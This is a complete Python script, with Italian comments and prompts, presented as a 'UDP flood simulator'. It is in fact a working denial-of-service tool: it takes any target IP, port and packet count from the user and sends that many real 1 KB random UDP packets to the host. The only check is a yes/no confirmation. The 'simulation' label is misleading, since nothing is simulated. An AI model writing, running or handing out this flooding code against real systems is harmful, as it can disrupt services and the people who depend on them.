import socket
import random

def udp_flood_simulator():
    
    # Input parametri
    target_ip = input("Inserisci IP target: ")
    target_port = int(input("Inserisci porta UDP target: "))
    packet_count = int(input("Numero pacchetti da inviare: "))
    
    # Creazione socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Dimensione pacchetto: 1 KB = 1024 bytes
    packet_size = 1024
    
    print(f"\n[*] Avvio simulazione...")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Pacchetti: {packet_count} x {packet_size} bytes\n")
    
    sent = 0
    
    try:
        for i in range(packet_count):
            # Generazione payload casuale da 1 KB
            payload = bytes([random.randint(0, 255) for _ in range(packet_size)])
            
            # Invio pacchetto
            sock.sendto(payload, (target_ip, target_port))
            sent += 1
            
            # Feedback ogni 1000 pacchetti
            if (i + 1) % 1000 == 0:
                print(f"[+] Inviati {i + 1}/{packet_count} pacchetti")
        
        print(f"\n[✓] Simulazione completata: {sent} pacchetti inviati")
        print(f"[✓] Volume totale: {(sent * packet_size) / 1024:.2f} KB")
        
    except Exception as e:
        print(f"\n[!] Errore: {e}")
    
    finally:
        sock.close()

conferma = input("Confermi di voler utilizzare un UDP flood simulator? (si/no): ")
    
if conferma.lower() == "si":
        udp_flood_simulator()
else:
        print("Operazione annullata.")
